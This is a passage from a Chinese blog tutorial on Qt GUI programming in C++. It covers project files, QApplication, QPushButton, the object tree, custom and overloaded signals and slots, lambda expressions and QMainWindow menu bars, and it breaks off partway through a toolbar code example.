<p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207153758775.png" alt="image-20201207153758775"></p>
<h3 id="2-pro文件"><a href="#2-pro文件" class="headerlink" title="2. .pro文件"></a>2. .pro文件</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">QT       += core gui  <span class="comment">//包含的模块</span></span><br><span class="line">greaterThan(QT_MAJOR_VERSION, <span class="number">4</span>): QT += widgets <span class="comment">//大于Qt4版本 才包含widget模块</span></span><br><span class="line">TARGET = QtFirst  <span class="comment">//应用程序名  生成的.exe程序名称</span></span><br><span class="line">TEMPLATE = app    <span class="comment">//模板类型    应用程序模板</span></span><br><span class="line">SOURCES += main.cpp\   <span class="comment">//源文件</span></span><br><span class="line">        mywidget.cpp</span><br><span class="line">HEADERS  += mywidget.h   <span class="comment">//头文件</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong><em>\</em>.pro就是工程文件(project)，它是qmake自动生成的用于生产makefile的配置文件**</strong>。</p>
</blockquote>
<h3 id="3-main-cpp"><a href="#3-main-cpp" class="headerlink" title="3.main.cpp"></a>3.main.cpp</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"mainwindow.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QApplication&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//a 应用程序对象 在Qt中 有且仅有一个</span></span><br><span class="line">    <span class="function">QApplication <span class="title">a</span><span class="params">(argc, argv)</span></span>;</span><br><span class="line">    <span class="comment">//窗口对象 MainWindow</span></span><br><span class="line">    MainWindow w;</span><br><span class="line">    <span class="comment">//必须要show方法才可以展示</span></span><br><span class="line">    w.show();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> a.exec();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>解释：</p>
<ul>
<li>Qt系统提供的标准类名声明头文件没有.h后缀</li>
<li>Qt一个类对应一个头文件，类名就是头文件名</li>
<li>QApplication应用程序类</li>
<li><ol>
<li>管理图形用户界面应用程序的控制流和主要设置。</li>
<li>是Qt的整个后台管理的命脉它<strong>包含主事件循环**</strong>，在其中来自窗口系统和其它资源的<strong>*所有事件处理和调度。它也处理应用程序的初始化和结束</strong>，并且<strong>提供对话管理</strong>。</li>
<li>对于任何一个使用Qt的图形用户界面应用程序，都正好存在一个QApplication 对象，而不论这个应用程序在同一时间内是不是有0、1、2或更多个窗口。</li>
</ol>
</li>
<li><p>a.exec()</p>
</li>
</ul>
<p>程序进入消息循环，等待对用户输入进行响应。这里main()把控制权转交给Qt，Qt完成事件处理工作，当应用程序退出的时候exec()的值就会返回。<strong>在exec()中，Qt接受并处理用户和系统的事件并且把它们传递给适当的窗口部件。</strong></p>
<h3 id="4-快捷键及命名规范"><a href="#4-快捷键及命名规范" class="headerlink" title="4.快捷键及命名规范"></a>4.快捷键及命名规范</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//命名规范 </span></span><br><span class="line"><span class="comment">//类名 首字母大写，单词和单词之间首字母大写</span></span><br><span class="line"><span class="comment">//函数名 首字母小写</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ctrl + / 注释</span></span><br><span class="line"><span class="comment">//ctrl + r 运行</span></span><br><span class="line"><span class="comment">//ctrl + b 编译</span></span><br><span class="line"><span class="comment">//f1 帮助文档</span></span><br><span class="line"><span class="comment">//ctrl + shift + 上 上移</span></span><br><span class="line"><span class="comment">//ctrl + i 对齐</span></span><br><span class="line"><span class="comment">//f4 切换.cpp 和 .h</span></span><br></pre></td></tr></table></figure>
<h2 id="0x02-新建Qt程序"><a href="#0x02-新建Qt程序" class="headerlink" title="0x02 新建Qt程序"></a>0x02 新建Qt程序</h2><h3 id="1-QPushButton"><a href="#1-QPushButton" class="headerlink" title="1.QPushButton"></a>1.QPushButton</h3><p>创建按钮</p>
<p>把下面这段代码复制到widget.cpp</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;QPushButton&gt;</span></span></span><br><span class="line">&#123; </span><br><span class="line">    <span class="comment">//按钮操作</span></span><br><span class="line">	  <span class="comment">//创建第一个按钮</span></span><br><span class="line">    QPushButton * btn = <span class="keyword">new</span> QPushButton;</span><br><span class="line">    <span class="comment">//show以顶层方式弹出控件</span></span><br><span class="line">    btn-&gt;show(); </span><br><span class="line">    <span class="comment">//设置父亲</span></span><br><span class="line">    btn-&gt;setParent(<span class="keyword">this</span>);</span><br><span class="line">    <span class="comment">//显示文本</span></span><br><span class="line">    btn-&gt;setText(<span class="string">"第一个"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//此外还有第二种方法进行操作</span></span><br><span class="line">    <span class="comment">//创建第二个按钮</span></span><br><span class="line">    <span class="comment">//按照控件大小创建窗口</span></span><br><span class="line">    QPushButton * btn2 = <span class="keyword">new</span> QPushButton(<span class="string">"第二个"</span>,<span class="keyword">this</span>);</span><br><span class="line">    <span class="comment">//移动btn2按钮</span></span><br><span class="line">    btn2-&gt;<span class="built_in">move</span>(<span class="number">100</span>,<span class="number">100</span>);</span><br><span class="line">    <span class="comment">//重置按钮大小</span></span><br><span class="line">    btn2-&gt;resize(<span class="number">50</span>,<span class="number">50</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//窗口操作</span></span><br><span class="line">    <span class="comment">//重置窗口大小</span></span><br><span class="line">    resize(<span class="number">600</span>,<span class="number">400</span>);</span><br><span class="line">    <span class="comment">//设置固定窗口大小</span></span><br><span class="line">    <span class="comment">//setFixedSize(600,400);</span></span><br><span class="line">    <span class="comment">//设置窗口标题</span></span><br><span class="line">    setWindowTitle(<span class="string">"计算器"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207155120350.png" alt="image-20201207155120350"></p>
<h3 id="2-对象树"><a href="#2-对象树" class="headerlink" title="2.对象树"></a>2.对象树</h3><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207155310260.png" alt="image-20201207155310260"></p>
<p>自己创建一个MyPushButton</p>
<p>同时继承QPushButton</p>
<p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207155345296.png" alt="image-20201207155345296"></p>
<p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207111505680.png" alt="image-20201207111505680"></p>
<p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207111746909.png" alt="image-20201207111746909"></p>
<p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207111806797.png" alt="image-20201207111806797"></p>
<p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207111921782.png" alt="image-20201207111921782"></p>
<p>代码如下</p>
<p><code>mypushbutton.cpp</code></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"mypushbutton.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QDebug&gt;</span></span></span><br><span class="line"></span><br><span class="line">MyPushButton::MyPushButton(QWidget *parent) : QPushButton(parent)</span><br><span class="line">&#123;</span><br><span class="line">    qDebug() &lt;&lt; <span class="string">"按钮构造调用"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MyPushButton::~MyPushButton()</span><br><span class="line">&#123;</span><br><span class="line">    qDebug() &lt;&lt; <span class="string">"按钮构造析构"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>mypushbutton.h</code></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MYPUSHBUTTON_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MYPUSHBUTTON_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QWidget&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;QPushButton&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyPushButton</span> :</span> <span class="keyword">public</span> QPushButton</span><br><span class="line">&#123;</span><br><span class="line">    Q_OBJECT</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">MyPushButton</span><span class="params">(QWidget *parent = <span class="literal">nullptr</span>)</span></span>;</span><br><span class="line">     ~MyPushButton();</span><br><span class="line">signals:</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// MYPUSHBUTTON_H</span></span></span><br></pre></td></tr></table></figure>
<p><code>widget.cpp</code></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建自己按钮对象</span></span><br><span class="line">MyPushButton *btn3 = <span class="keyword">new</span> MyPushButton;</span><br><span class="line">btn3-&gt;show();</span><br><span class="line">btn3-&gt;setParent(<span class="keyword">this</span>);</span><br><span class="line">btn3-&gt;setText(<span class="string">"我的按钮"</span>);</span><br><span class="line">btn3-&gt;<span class="built_in">move</span>(<span class="number">200</span>,<span class="number">100</span>);</span><br></pre></td></tr></table></figure>
<p>图示如下</p>
<p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207215449993.png" alt="image-20201207215449993"></p>
<h2 id="0x03-信号和槽的机制"><a href="#0x03-信号和槽的机制" class="headerlink" title="0x03 信号和槽的机制"></a>0x03 信号和槽的机制</h2><h3 id="1-信号和槽"><a href="#1-信号和槽" class="headerlink" title="1.信号和槽"></a>1.信号和槽</h3><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/Qt%E4%BF%A1%E5%8F%B7%E5%92%8C%E6%A7%BD%20.png" alt="Qt信号和槽 "></p>
<p>基本的接口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;给我的按钮一个关闭窗口的功能</span><br><span class="line">&#x2F;&#x2F;参数1 信号发送者 	参数2 发送的信号(函数地址)	 参数3 信号接收者 参数4 处理的槽函数</span><br><span class="line">connect(btn3, &amp;QPushButton::clicked, this, &amp;QWidget::close);</span><br></pre></td></tr></table></figure>
<h4 id="自定义信号和槽"><a href="#自定义信号和槽" class="headerlink" title="自定义信号和槽"></a><strong>自定义信号和槽</strong></h4><p>自定义信号</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//类的.h文件下</span></span><br><span class="line">signals:</span><br><span class="line">    <span class="comment">//自定义信号 写在signals下</span></span><br><span class="line">    <span class="comment">//返回值是void 只需要声明 不需要实现</span></span><br><span class="line">    <span class="comment">//可以有参数，可以重载</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">rang</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>
<p>自定义槽</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//类的.文件public中</span></span><br><span class="line"><span class="keyword">public</span></span><br><span class="line">    <span class="comment">//返回值是void 需要声明 需要实现</span></span><br><span class="line">    <span class="comment">//可以有参数，可以重载</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">recv</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//实现在类的.cpp中实现</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MyPushButton::recv</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    qDebug() &lt;&lt; <span class="string">"接受成功"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接下来进行一个<strong>小的案例</strong></p>
<blockquote>
<p>一个按钮响起之后 程序输出接受成功</p>
</blockquote>
<p>我们首先得有两个类</p>
<ol>
<li>button</li>
<li>recv</li>
</ol>
<p>然后得有<strong>信号 槽函数 定义槽函数 </strong></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//button.h</span></span><br><span class="line">signals:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">rang</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//recv.h</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">recvsignals</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//recv.cpp</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">recv::recvsignals</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    qDebug() &lt;&lt; <span class="string">"接受成功"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后就是连接,这里我们<strong>需要注意只有rang之后才会接受</strong></p>
<p>所以就需要rang起来，<strong>这里用的plz函数让它rang</strong></p>
<p>其中的一些成员名需要在<code>widget.h</code>中是实现</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//widget.h</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Widget(QWidget *parent = <span class="literal">nullptr</span>);</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">plz</span><span class="params">()</span></span>;</span><br><span class="line">    ~Widget();</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    MyPushButton * btn;</span><br><span class="line">    recv * recv1;</span><br><span class="line"></span><br><span class="line"><span class="comment">//widget.cpp</span></span><br><span class="line">        <span class="keyword">this</span>-&gt;btn = <span class="keyword">new</span> MyPushButton(<span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">this</span>-&gt;recv1 = <span class="keyword">new</span> recv;</span><br><span class="line">        btn-&gt;show();</span><br><span class="line">        btn-&gt;setParent(<span class="keyword">this</span>);</span><br><span class="line">        btn-&gt;setText(<span class="string">"我的按钮"</span>);</span><br><span class="line">        btn-&gt;<span class="built_in">move</span>(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">connect</span>(btn, &amp;MyPushButton::rang, recv1, &amp;recv::recvsignals);</span><br><span class="line">        plz();</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Widget::plz</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    emit btn-&gt;rang();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="2-重载信号和槽"><a href="#2-重载信号和槽" class="headerlink" title="2.重载信号和槽"></a>2.重载信号和槽</h3><p>接着上个案例</p>
<p><strong>重载信号 重载槽 重新定义槽函数</strong> </p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//button.h</span></span><br><span class="line">signals:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">rang</span><span class="params">(QString)</span></span>;</span><br><span class="line"><span class="comment">//recv.h</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">recvsignals</span><span class="params">(QString s)</span></span>;</span><br><span class="line"><span class="comment">//recv.p</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">recv::recvsignals</span><span class="params">(QString second)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    qDebug() &lt;&lt; <span class="string">"接受成功响铃"</span> &lt;&lt; second &lt;&lt; <span class="string">"秒"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由于连接无法分清函数地址，这里用<strong>函数指针来体现函数地址</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//简单说一下函数指针</span></span><br><span class="line"><span class="comment">//返回类型为空 第一个括号里为指针 第二个括号为参数 =后面是需要指向函数的地址</span></span><br><span class="line"><span class="keyword">void</span>(recv:: *recvslot)(QString) = &amp;recv::recvsignals;</span><br><span class="line"><span class="keyword">void</span>(MyPushButton:: *ButtonSignal)(QString) = &amp;MyPushButton::rang;</span><br><span class="line"><span class="built_in">connect</span>(btn, ButtonSignal, recv1, recvslot);</span><br><span class="line">plz();</span><br></pre></td></tr></table></figure>
<p>成功实现</p>
<p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207233628350.png" alt="image-20201207233628350"></p>
<blockquote>
<p>Qstring怎么去掉引号</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;second.toUtf8().data()</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="3-信号和槽的拓展"><a href="#3-信号和槽的拓展" class="headerlink" title="3.信号和槽的拓展"></a>3.信号和槽的拓展</h3><ul>
<li>信号可以连接信号</li>
<li>一个信号可以连接多个槽函数</li>
<li>多个信号可以连接同一个槽函数</li>
<li><strong>信号和槽函数的类型必须一一对应</strong></li>
<li>信号的参数个数可以大于槽函数的参数个数</li>
</ul>
<h4 id="信号连接信号"><a href="#信号连接信号" class="headerlink" title="信号连接信号"></a>信号连接信号</h4><p>继续下一个</p>
<p><strong>我们按下按钮1才会响铃</strong></p>
<p>这里用两种实现</p>
<ol>
<li>点击连接plz函数</li>
<li><strong>点击连接响铃信号</strong>,此时函数中无参数</li>
</ol>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//widget.cpp</span></span><br><span class="line">        QPushButton *btn1 = <span class="keyword">new</span> QPushButton(<span class="string">"响铃"</span>,<span class="keyword">this</span>);</span><br><span class="line">        btn1-&gt;<span class="built_in">move</span>(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">connect</span>(btn1,&amp;QPushButton::clicked,<span class="keyword">this</span>,&amp;Widget::plz);</span><br><span class="line"><span class="comment">//widget.cpp</span></span><br><span class="line">		    QPushButton *btn1 = <span class="keyword">new</span> QPushButton(<span class="string">"响铃"</span>,<span class="keyword">this</span>);</span><br><span class="line">        btn1-&gt;<span class="built_in">move</span>(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">connect</span>(btn1,&amp;QPushButton::clicked,btn,ButtonSignal);</span><br></pre></td></tr></table></figure>
<p>效果图如下</p>
<p>方法1</p>
<p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201208162609069.png" alt="image-20201208162609069"></p>
<p>方法2</p>
<p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201208163512899.png" alt="image-20201208163512899"></p>
<h3 id="4-Lambda表达式"><a href="#4-Lambda表达式" class="headerlink" title="4.Lambda表达式"></a>4.Lambda表达式</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[=]()&#123;</span><br><span class="line">			btn1-&gt;setText(<span class="string">"第二个"</span>);</span><br><span class="line">&#125;();  <span class="comment">//()调用</span></span><br><span class="line"><span class="comment">//[]必须存在 不可省略</span></span><br><span class="line"><span class="comment">//()重载函数的参数</span></span><br><span class="line"><span class="comment">//= 值传递</span></span><br><span class="line"><span class="comment">//&amp; 引用传递</span></span><br><span class="line"><span class="comment">//a 只对a传递</span></span><br><span class="line"><span class="comment">//&amp;a 只对引用a传递</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//对于想要值修改，需要mutable关键字,但不改变本体</span></span><br><span class="line">[=]()<span class="keyword">mutable</span>&#123;m = <span class="number">100</span> + <span class="number">10</span>;</span><br><span class="line">            qDebug &lt;&lt; m;&#125;();</span><br><span class="line"><span class="comment">//返回值 -&gt;返回值类型</span></span><br><span class="line"><span class="keyword">int</span> ret = []()-&gt;<span class="keyword">int</span>&#123;<span class="keyword">return</span> <span class="number">1000</span>;&#125;();</span><br></pre></td></tr></table></figure>
<h2 id="0x04-QMainWindow"><a href="#0x04-QMainWindow" class="headerlink" title="0x04 QMainWindow"></a>0x04 QMainWindow</h2><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201208225426943.png" alt="image-20201208225426943"></p>
<h3 id="1-菜单栏"><a href="#1-菜单栏" class="headerlink" title="1.菜单栏"></a>1.菜单栏</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//菜单栏</span></span><br><span class="line"><span class="comment">//菜单栏最多有一个</span></span><br><span class="line"><span class="comment">//创建菜单栏</span></span><br><span class="line">QMenuBar * bar = menuBar();</span><br><span class="line"><span class="comment">//将菜单栏放入到窗口中</span></span><br><span class="line">setMenuBar(bar);</span><br><span class="line"><span class="comment">//创建菜单</span></span><br><span class="line">QMenu * fileMenu = bar-&gt;addMenu(<span class="string">"文件"</span>);</span><br><span class="line">QMenu * editMenu = bar-&gt;addMenu(<span class="string">"编辑"</span>);</span><br><span class="line"><span class="comment">//创建菜单项</span></span><br><span class="line"><span class="comment">//fileMenu-&gt;addAction("新建");</span></span><br><span class="line">QAction * action1 = fileMenu-&gt;addAction(<span class="string">"新建"</span>);</span><br><span class="line"><span class="comment">//添加分隔符</span></span><br><span class="line">fileMenu-&gt;addSeparator();</span><br><span class="line">QAction * action2 = fileMenu-&gt;addAction(<span class="string">"打开"</span>);</span><br></pre></td></tr></table></figure>
<h3 id="2-工具栏"><a href="#2-工具栏" class="headerlink" title="2.工具栏"></a>2.工具栏</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//工具栏</span></span><br><span class="line"><span class="comment">//工具栏 可以有多个</span></span><br><span class="line">QToolBar * toolBar = <span class="keyword">new</span> QToolBar(<span class="keyword">this</span>);</span><br><span class="line"><span class="comment">//工具栏区域</span></span><br><span class="line">addToolBar(Qt::LeftToolBarArea,toolBar);</span><br><span class="line"><span class="comment">//设置工具栏区域 只允许左右停靠</span></span><br><span class="line">toolBar-&gt;setAllowedAreas(Qt::LeftToolBarArea|Qt::RightToolBarArea);</span><br><span class="line"><span class="comment">//设置浮动</span></span><br><span 